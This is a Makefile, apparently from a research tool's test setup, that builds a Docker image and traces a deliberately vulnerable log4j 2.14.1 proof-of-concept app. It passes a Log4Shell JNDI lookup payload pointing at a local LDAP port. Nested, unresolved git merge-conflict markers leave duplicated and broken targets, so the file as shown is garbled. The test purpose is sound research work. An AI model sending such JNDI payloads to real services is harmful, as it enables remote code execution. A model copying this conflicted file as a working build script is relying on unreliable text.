MAKEFILE_PATH := $(abspath $(lastword $(MAKEFILE_LIST)))
MAKEFILE_DIR := $(patsubst %/,%,$(dir $(MAKEFILE_PATH)))
REPO_DIR := $(abspath $(MAKEFILE_DIR)/../..)
IMAGE_NAME := trailofbits/mttn-log4shell

<<<<<<< HEAD:test/log4shell/Makefile
log4shell.trace: compile
	make -C vulnerable-app log4shell-poc.jar
	docker run -it --rm --security-opt seccomp=unconfined --mount type=bind,source="$(REPO_DIR)",target=/app/mttn \
=======
.PHONY: run
run: docker
	docker run -it --rm --security-opt seccomp=unconfined --mount type=bind,source="$(shell pwd)",target=/app $(IMAGE_NAME) /bin/bash

.PHONY: log4shell.trace
log4shell.trace:
	make -C vulnerable-app log4shell-poc.jar
	docker run -it --rm --security-opt seccomp=unconfined --mount type=bind,source="$(shell pwd)",target=/app \
>>>>>>> 1252281 (TASK(jl): fully integrated Docker+nix):exploit/log4shell/Makefile
		-e RUST_LOG=debug \
		$(IMAGE_NAME) \
	mttn --ignore-unsupported-memops java -- \
		-cp vulnerable-app/log4shell-poc.jar:vulnerable-app/lib/log4j-api-2.14.1.jar:vulnerable-app/lib/log4j-core-2.14.1.jar \
		com.trailofbits.log4shell.PoC '$${jndi:ldap://127.0.0.1:1337/pwn}' \
	> $@

.PHONY: run
run: docker
	docker run -it --rm --security-opt seccomp=unconfined --mount type=bind,source="$(REPO_DIR)",target=/app/mttn $(IMAGE_NAME) /bin/bash

.PHONY: test
test:
	@rm -f log4shell.trace
	@$(MAKE) log4shell.trace

<<<<<<< HEAD:test/log4shell/Makefile
.PHONY: compile
compile: docker
<<<<<<< HEAD:test/log4shell/Makefile
	docker run -it --rm --security-opt seccomp=unconfined --mount type=bind,source="$(REPO_DIR)",target=/app/mttn $(IMAGE_NAME) cargo build
=======
	docker run -it --rm --security-opt seccomp=unconfined --mount type=bind,source="$(shell pwd)",target=/app $(IMAGE_NAME) cargo build
>>>>>>> 1252281 (TASK(jl): fully integrated Docker+nix):exploit/log4shell/Makefile

=======
>>>>>>> 5384869 (fixup! TASK(jl): fully integrated Docker+nix):exploit/log4shell/Makefile
.PHONY: docker
docker: .last_built

.last_built: Dockerfile
	make -C OpenJDK-i386 docker
	docker build -t $(IMAGE_NAME) -f $(MAKEFILE_DIR)/Dockerfile $(MAKEFILE_DIR)
	@touch .last_built
	@echo Built $(IMAGE_NAME)

.PHONY: rebuild
rebuild: openjdk
	docker build --no-cache -t $(IMAGE_NAME) -f $(MAKEFILE_DIR)/Dockerfile $(MAKEFILE_DIR)
	@touch .last_built
	@echo Built $(IMAGE_NAME)

.PHONY: clean
clean:
	make -C OpenJDK-i386 clean
	make -C vulnerable-app clean
	@rm -f .last_built
	-docker image rm $(IMAGE_NAME)

.PHONY: openjdk
openjdk:
	make -C OpenJDK-i386 docker
